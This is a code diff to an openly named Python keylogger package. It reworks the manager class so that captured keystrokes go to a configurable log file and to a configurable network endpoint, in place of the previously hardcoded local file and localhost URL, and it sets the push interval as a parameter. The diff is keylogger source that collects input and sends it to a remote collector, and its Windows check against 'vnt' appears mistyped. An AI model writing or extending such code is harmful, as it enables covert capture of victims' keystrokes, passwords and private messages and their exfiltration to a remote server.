@@ -2,12 +2,12 @@ import logging
 import os
 import threading
 import time
-from typing import Protocol
+from typing import Protocol, Optional
 
 from keylogger.file_writer import FileWriter
 from keylogger.network_writer import NetworkWriter
 from keylogger.sinker import Sinker
-from keylogger.processor import  Processor
+from keylogger.processor import Processor
 from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
 
 logger = logging.getLogger(__name__)
@@ -43,7 +43,12 @@ class DefaultManager:
     and then sinks the processed data using the sink.
     """
 
-    def __init__(self):
+    def __init__(
+        self,
+        log_path: Optional[str] = None,
+        endpoint: Optional[str] = None,
+        push_interval: int = 60,
+    ):
         # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
         if os.name == "vnt":
             keylogger = WindowsKeylogger()
@@ -51,9 +56,15 @@ class DefaultManager:
             keylogger = LinuxKeylogger()
 
         self.processor = Processor("")
-        self.sink = [FileWriter("keylogger.log"),NetworkWriter("http://localhost:5000/data")]
+
+        self.sink = []
+        if log_path:
+            self.sink.append(FileWriter(log_path))
+        if endpoint:
+            self.sink.append(NetworkWriter(endpoint))
+
         self.listner = keylogger
-        self.interval = 10
+        self.interval = push_interval
         self._loop_thread = threading.Thread(target=self._loop)
         self._stopped = False
 
